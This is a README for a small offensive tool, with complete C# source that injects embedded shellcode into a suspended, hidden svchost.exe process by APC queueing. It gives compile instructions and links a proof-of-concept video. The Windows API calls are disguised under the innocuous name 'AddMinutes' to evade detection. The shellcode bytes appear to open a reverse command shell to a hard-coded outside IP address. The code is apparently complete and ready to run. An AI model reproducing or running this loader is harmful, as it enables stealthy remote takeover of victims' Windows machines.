# SVCHOSTEXE
Execute shellcode with svchost.exe -k LocalSystemNetworkResticted
compile: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /platform:x64 /target:exe /unsafe svcexec.cs

PoC vid: https://www.youtube.com/watch?v=UpOskWR8n20&feature=youtu.be

svcexec.cs:

```

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Code
{
    class Program
    {

        static void Main(string[] args)
        {


            string scode = "072 131 228 240 232 192 000 000 000 065 081 065 080 082 081 086 072 049 210 101 072 139 082 096 072 139 082 024 072 139 082 032 072 "+
                     "139 114 080 072 015 183 074 074 077 049 201 072 049 192 172 060 097 124 002 044 032 065 193 201 013 065 001 193 226 237 082 065 081 "+
                     "072 139 082 032 139 066 060 072 001 208 139 128 136 000 000 000 072 133 192 116 103 072 001 208 080 139 072 024 068 139 064 032 073 "+
                     "001 208 227 086 072 255 201 065 139 052 136 072 001 214 077 049 201 072 049 192 172 065 193 201 013 065 001 193 056 224 117 241 076 "+
                     "003 076 036 008 069 057 209 117 216 088 068 139 064 036 073 001 208 102 065 139 012 072 068 139 064 028 073 001 208 065 139 004 136 "+
                     "072 001 208 065 088 065 088 094 089 090 065 088 065 089 065 090 072 131 236 032 065 082 255 224 088 065 089 090 072 139 018 233 087 "+
                     "255 255 255 093 073 190 119 115 050 095 051 050 000 000 065 086 073 137 230 072 129 236 160 001 000 000 073 137 229 073 188 002 000 "+
                     "001 187 087 057 141 215 065 084 073 137 228 076 137 241 065 186 076 119 038 007 255 213 076 137 234 104 001 001 000 000 089 065 186 "+
                     "041 128 107 000 255 213 080 080 077 049 201 077 049 192 072 255 192 072 137 194 072 255 192 072 137 193 065 186 234 015 223 224 255 "+
                     "213 072 137 199 106 016 065 088 076 137 226 072 137 249 065 186 153 165 116 097 255 213 072 129 196 064 002 000 000 073 184 099 109 "+
                     "100 000 000 000 000 000 065 080 065 080 072 137 226 087 087 087 077 049 192 106 013 089 065 080 226 252 102 199 068 036 084 001 001 "+
                     "072 141 068 036 024 198 000 104 072 137 230 086 080 065 080 065 080 065 080 073 255 192 065 080 073 255 200 077 137 193 076 137 193 "+
                     "065 186 121 204 063 134 255 213 072 049 210 072 255 202 139 014 065 186 008 135 029 096 255 213 187 240 181 162 086 065 186 166 149 "+
                     "189 157 255 213 072 131 196 040 060 006 124 010 128 251 224 117 005 187 071 019 114 111 106 000 089 065 137 218 255 213";

            int scodeLength = (scode.Length / 4) + 1;
            bool result;
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            result = AddMinutes("c:\\windows\\system32\\svchost.exe", "c:\\windows\\system32\\svchost.exe -k LocalSystemNetworkResticted", IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, "C:\\Windows\\System32\\", ref si, out pi); // CreateProcess
            IntPtr allocMemAddress = AddMinutes(pi.hProcess, IntPtr.Zero, scodeLength + 1, MEM_COMMIT, PAGE_READWRITE); // VirtualAllocEx
            IntPtr allocMemAddressCopy;
            allocMemAddressCopy = allocMemAddress;
            IntPtr bytesWritten = IntPtr.Zero;
            uint CPR = 0;
            byte [] data = new byte [] { 000 };
            string buffer = "";
            int jumpPos = 0;

            for (int i = 1; i <= (scodeLength); i++)
            {
                buffer = scode.Substring(jumpPos, 3);
   					    data[0] = Byte.Parse(buffer);
                result = AddMinutes(pi.hProcess, allocMemAddress, data, 1, out bytesWritten); // WriteProcessMemory
                allocMemAddress = allocMemAddress + 1;
     					  jumpPos = jumpPos + 4;
     			  }

            result = AddMinutes(pi.hProcess, allocMemAddressCopy, scodeLength, PAGE_EXECUTE_READ, out CPR); // VirtualProtectEx
            Process targetProc = Process.GetProcessById((int)pi.dwProcessId);
            ProcessThreadCollection currentThreads = targetProc.Threads;
            IntPtr openThreadPtr = AddMinutes(ThreadAccess.SET_CONTEXT, false, currentThreads[0].Id); // OpenThread
            IntPtr APCPtr = AddMinutes(allocMemAddressCopy, openThreadPtr, IntPtr.Zero); // QueueUserAPC
            IntPtr ThreadHandler = pi.hThread;
            AddMinutes(ThreadHandler); // ResumeThread
        }

        class Win32
        {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);

            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        }


            private static UInt32 MEM_COMMIT = 0x1000;
    				private static UInt32 PAGE_READWRITE = 0x04;
    				private static UInt32 PAGE_EXECUTE_READ = 0x20;

      			[Flags]
      			public enum ProcessAccessFlags : uint
      			{
      				  All = 0x001F0FFF,
      					Terminate = 0x00000001,
      					CreateThread = 0x00000002,
      					VirtualMemoryOperation = 0x00000008,
      					VirtualMemoryRead = 0x00000010,
      					VirtualMemoryWrite = 0x00000020,
      					DuplicateHandle = 0x00000040,
      					CreateProcess = 0x000000080,
      					SetQuota = 0x00000100,
      					SetInformation = 0x00000200,
      					QueryInformation = 0x00000400,
      					QueryLimitedInformation = 0x00001000,
      					Synchronize = 0x00100000
      			}

      			[Flags]
      			public enum ProcessCreationFlags : uint
      			{
      					ZERO_FLAG = 0x00000000,
      					CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
      					CREATE_DEFAULT_ERROR_MODE = 0x04000000,
      					CREATE_NEW_CONSOLE = 0x00000010,
      					CREATE_NEW_PROCESS_GROUP = 0x00000200,
      					CREATE_NO_WINDOW = 0x08000000,
      					CREATE_PROTECTED_PROCESS = 0x00040000,
      					CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
      					CREATE_SEPARATE_WOW_VDM = 0x00001000,
      					CREATE_SHARED_WOW_VDM = 0x00001000,
      					CREATE_SUSPENDED = 0x00000004,
      					CREATE_UNICODE_ENVIRONMENT = 0x00000400,
      					DEBUG_ONLY_THIS_PROCESS = 0x00000002,
      					DEBUG_PROCESS = 0x00000001,
      					DETACHED_PROCESS = 0x00000008,
      					EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
      					INHERIT_PARENT_AFFINITY = 0x00010000
      			}

            public struct PROCESS_INFORMATION
      			{
      					public IntPtr hProcess;
      					public IntPtr hThread;
      					public uint dwProcessId;
      					public uint dwThreadId;
      			}

            public struct STARTUPINFO
      			{
      					public uint cb;
      					public string lpReserved;
      					public string lpDesktop;
      					public string lpTitle;
      					public uint dwX;
      					public uint dwY;
      					public uint dwXSize;
      					public uint dwYSize;
      					public uint dwXCountChars;
      					public uint dwYCountChars;
      					public uint dwFillAttribute;
      					public uint dwFlags;
      					public short wShowWindow;
      					public short cbReserved2;
      					public IntPtr lpReserved2;
      					public IntPtr hStdInput;
      					public IntPtr hStdOutput;
      					public IntPtr hStdError;
      			}

      			[Flags]
      			public enum ThreadAccess : int
      				{
      					TERMINATE           = (0x0001) ,
      					SUSPEND_RESUME      = (0x0002) ,
      					GET_CONTEXT         = (0x0008) ,
      					SET_CONTEXT         = (0x0010) ,
      					SET_INFORMATION     = (0x0020) ,
      					QUERY_INFORMATION   = (0x0040) ,
      					SET_THREAD_TOKEN    = (0x0080) ,
      					IMPERSONATE         = (0x0100) ,
      					DIRECT_IMPERSONATION    = (0x0200)
      			}

            // If one want to use AddMinutes in every call the order must be correct the first use of AddMinutes = CreateProcess and second AddMinutes = VirtualAllocEx etc.
            class M1 { public const string day = "CreateProcess"; }
            [DllImport("kernel32.dll", EntryPoint=M1.day)]
            public static extern bool AddMinutes( string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation ); // CreateProcess

            class M2 { public const string day = "VirtualAllocEx"; }
            [DllImport("kernel32.dll", EntryPoint=M2.day, SetLastError = true )]
    				public static extern IntPtr AddMinutes( IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect ); // VirtualAllocEx

            class M3 { public const string day = "WriteProcessMemory"; }
    				[DllImport("kernel32.dll", EntryPoint=M3.day, SetLastError = true)]
    				public static extern bool AddMinutes(	IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten ); // WriteProcessMemory

            class M4 { public const string day = "VirtualProtectEx"; }
            [DllImport("kernel32.dll", EntryPoint=M4.day)]
    				public static extern bool AddMinutes( IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect ); // VirtualProtectEx

            class M5 { public const string day = "OpenThread"; }
    				[DllImport("kernel32.dll", EntryPoint=M5.day, SetLastError = true)]
    				public static extern IntPtr AddMinutes( ThreadAccess dwDesiredAccess, bool bInheritHandle, int dwThreadId ); // OpenThread

            class M6 { public const string day = "QueueUserAPC"; }
    				[DllImport("kernel32.dll", EntryPoint=M6.day)]
    				public static extern IntPtr AddMinutes( IntPtr pfnAPC, IntPtr hThread, IntPtr dwData ); // QueueUserAPC

            class M7 { public const string day = "ResumeThread"; }
            [DllImport("kernel32.dll", EntryPoint=M7.day)]
    				public static extern uint AddMinutes( IntPtr hThread ); // ResumeThread

      }

}



```
